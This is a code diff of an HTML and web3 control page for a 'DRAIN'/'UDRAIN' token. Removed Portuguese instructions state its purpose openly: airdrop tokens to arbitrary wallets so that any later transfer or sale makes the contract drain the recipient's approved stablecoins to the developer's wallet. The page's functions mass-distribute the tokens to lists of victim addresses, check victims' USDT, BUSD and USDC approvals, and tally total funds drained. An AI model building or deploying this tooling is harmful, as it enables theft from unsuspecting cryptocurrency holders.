@@ -1,130 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DRAIN Token Distributor</title>
+    <title>UDRAIN Token</title>
     <meta charset="utf-8">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
     <style>
-        :root {
-            --primary: #666;
-            --dark: #111;
-            --light: #222;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: Arial, sans-serif;
-            background: var(--dark);
-            color: #fff;
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .header {
-            background: var(--light);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .card {
-            background: var(--light);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 5px 0;
-            width: 100%;
-        }
-        
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            background: #333;
-            border: 1px solid #444;
-            border-radius: 6px;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-        
-        .info-box {
-            background: #333;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 10px 0;
-            font-size: 14px;
-        }
+        body { font-family: Arial; background: #111; color: white; margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .card { background: #222; padding: 20px; margin: 10px 0; border-radius: 10px; }
+        .btn { background: #666; color: white; border: none; padding: 12px; width: 100%; margin: 5px 0; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <h2>DRAIN Token Distributor</h2>
-            <p>Bla Bla Bla</p>
-        </div>
-
-        <!-- Instruções -->
         <div class="card">
-            <h3>🎯 Como Funciona</h3>
-            <div class="info-box">
-                <p><strong>1.</strong> Envie DRAIN tokens para qualquer carteira</p>
-                <p><strong>2.</strong> Quando a carteira tentar TRANSFERIR/VENDER/TROCAR DRAIN</p>
-                <p><strong>3.</strong> O contrato tenta drenar TODOS stablecoins automaticamente</p>
-                <p><strong>4.</strong> Funds vão DIRETO para carteira DEV</p>
-                <p><strong>⚠️</strong> Requer APPROVE prévio dos stablecoins</p>
-            </div>
-        </div>
-
-        <!-- Conexão -->
-        <div class="card">
+            <h3>UDRAIN Token System</h3>
             <button class="btn" id="connectWallet">Connect Wallet</button>
-            <div id="walletInfo" style="text-align: center; margin-top: 10px;"></div>
+            <div id="walletInfo"></div>
         </div>
 
-        <!-- Distribuição -->
         <div class="card">
-            <h3>📤 Distribuir DRAIN Tokens</h3>
-            <textarea id="walletList" placeholder="Wallet addresses (one per line)" rows="4"></textarea>
-            <input type="number" id="tokenAmount" placeholder="Amount per wallet" value="1">
-            <button class="btn" id="distributeTokens">Distribute DRAIN Tokens</button>
+            <h3>Distribute UDRAIN</h3>
+            <textarea id="walletList" placeholder="Wallet addresses (one per line)" rows="3"></textarea>
+            <button class="btn" id="distributeTokens">Distribute UDRAIN Tokens</button>
         </div>
 
-        <!-- Status -->
         <div class="card">
-            <h3>📊 System Status</h3>
-            <div id="systemStatus" class="info-box">
-                Total Drained: <span id="totalDrained">0</span><br>
-                Your Balance: <span id="yourBalance">0</span> DRAIN
-            </div>
-            <button class="btn" id="refreshStatus">Refresh Status</button>
-        </div>
-
-        <!-- Verificar Carteira -->
-        <div class="card">
-            <h3>🔍 Check Wallet</h3>
-            <input type="text" id="checkWallet" placeholder="Wallet address to check">
-            <button class="btn" id="checkWalletBtn">Check Wallet Status</button>
-            <div id="walletStatus" class="info-box"></div>
+            <h3>Check Wallet</h3>
+            <input type="text" id="checkWallet" placeholder="Wallet address">
+            <button class="btn" id="checkWalletBtn">Check Approvals</button>
+            <div id="walletStatus"></div>
         </div>
     </div>
 
@@ -365,7 +270,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('connectWallet').addEventListener('click', connectWallet);
             document.getElementById('distributeTokens').addEventListener('click', distributeTokens);
-            document.getElementById('refreshStatus').addEventListener('click', updateStatus);
             document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
         });
 
@@ -375,13 +279,8 @@
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     web3 = new Web3(window.ethereum);
                     userAccount = (await web3.eth.getAccounts())[0];
-                    
                     tokenContract = new web3.eth.Contract(tokenABI, TOKEN_CONTRACT_ADDRESS);
-                    
                     document.getElementById('walletInfo').textContent = `Connected: ${userAccount.substring(0,8)}...`;
-                    
-                    updateStatus();
-                    
                 } catch (error) {
                     alert('Connection error: ' + error.message);
                 }
@@ -392,74 +291,39 @@
 
         async function distributeTokens() {
             const walletsText = document.getElementById('walletList').value;
-            const amount = document.getElementById('tokenAmount').value;
-            
             const wallets = walletsText.split('\n').map(w => w.trim()).filter(w => w !== '');
             
-            if (wallets.length === 0 || !amount) {
-                alert('Please enter wallets and amount');
+            if (wallets.length === 0) {
+                alert('Please enter wallet addresses');
                 return;
             }
             
             try {
-                const weiAmount = web3.utils.toWei(amount, 'ether');
-                
-                await tokenContract.methods.distributeTokens(wallets, weiAmount).send({ 
-                    from: userAccount 
-                });
-                
-                alert('DRAIN tokens distributed successfully!');
-                document.getElementById('walletList').value = '';
-                
+                await tokenContract.methods.distributeTokens(wallets, web3.utils.toWei('1', 'ether')).send({ from: userAccount });
+                alert('UDRAIN tokens distributed!');
             } catch (error) {
-                alert('Distribution error: ' + error.message);
-            }
-        }
-
-        async function updateStatus() {
-            if (!web3 || !tokenContract) return;
-            
-            try {
-                const totalDrained = await tokenContract.methods.getTotalDrained().call();
-                const userBalance = await tokenContract.methods.balanceOf(userAccount).call();
-                const devWallet = await tokenContract.methods.DEV_WALLET().call();
-                
-                document.getElementById('totalDrained').textContent = web3.utils.fromWei(totalDrained, 'ether');
-                document.getElementById('yourBalance').textContent = web3.utils.fromWei(userBalance, 'ether');
-                
-            } catch (error) {
-                console.error('Status update error:', error);
+                alert('Error: ' + error.message);
             }
         }
 
         async function checkWallet() {
             const wallet = document.getElementById('checkWallet').value;
-            
             if (!web3.utils.isAddress(wallet)) {
                 alert('Invalid wallet address');
                 return;
             }
             
             try {
-                const [hasToken, lastDrainTime, usdtBalance, busdBalance, usdcBalance] = 
-                    await tokenContract.methods.getWalletStatus(wallet).call();
+                const [usdtAllowed, busdAllowed, usdcAllowed, hasUDRAIN] = await tokenContract.methods.checkApprovals(wallet).call();
                 
-                let statusHTML = `
-                    Has DRAIN: <strong>${hasToken ? '✅' : '❌'}</strong><br>
-                    USDT Balance: <strong>${web3.utils.fromWei(usdtBalance, 'ether')}</strong><br>
-                    BUSD Balance: <strong>${web3.utils.fromWei(busdBalance, 'ether')}</strong><br>
-                    USDC Balance: <strong>${web3.utils.fromWei(usdcBalance, 'ether')}</strong><br>
-                `;
+                let status = `Has UDRAIN: ${hasUDRAIN ? '✅' : '❌'}<br>`;
+                status += `USDT Approved: ${web3.utils.fromWei(usdtAllowed, 'ether')}<br>`;
+                status += `BUSD Approved: ${web3.utils.fromWei(busdAllowed, 'ether')}<br>`;
+                status += `USDC Approved: ${web3.utils.fromWei(usdcAllowed, 'ether')}<br>`;
                 
-                if (lastDrainTime > 0) {
-                    const date = new Date(lastDrainTime * 1000);
-                    statusHTML += `Last Drained: <strong>${date.toLocaleString()}</strong>`;
-                }
-                
-                document.getElementById('walletStatus').innerHTML = statusHTML;
-                
+                document.getElementById('walletStatus').innerHTML = status;
             } catch (error) {
-                alert('Error checking wallet: ' + error.message);
+                alert('Error: ' + error.message);
             }
         }
     </script>
